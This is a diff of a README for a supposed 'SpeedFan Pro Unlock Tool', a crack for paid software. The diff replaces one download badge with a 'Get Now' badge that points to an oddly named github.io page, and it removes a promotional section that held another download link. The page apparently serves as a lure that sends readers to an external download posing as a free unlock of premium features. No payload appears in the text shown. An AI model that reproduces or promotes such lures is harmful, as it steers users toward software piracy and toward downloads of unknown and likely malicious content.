@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ SpeedFan Pro Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://speedfan-pro-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20SpeedFan%20Pro%20Unlock%20Tool-Enable%20All%20Features-0061FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download SpeedFan Pro Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://bouillonseaaseeplw.github.io/.github/speedfan-pro)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -89,13 +84,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock SpeedFan Pro – Advanced Cooling and Temperature Control
-
-Unlock all SpeedFan Pro premium features to take control of your system's cooling, monitor temperatures, and improve hardware stability.  
-[Download the Unlock Tool](https://speedfan-pro-download.github.io/.github/) and keep your PC running cool.
 
 ---
 
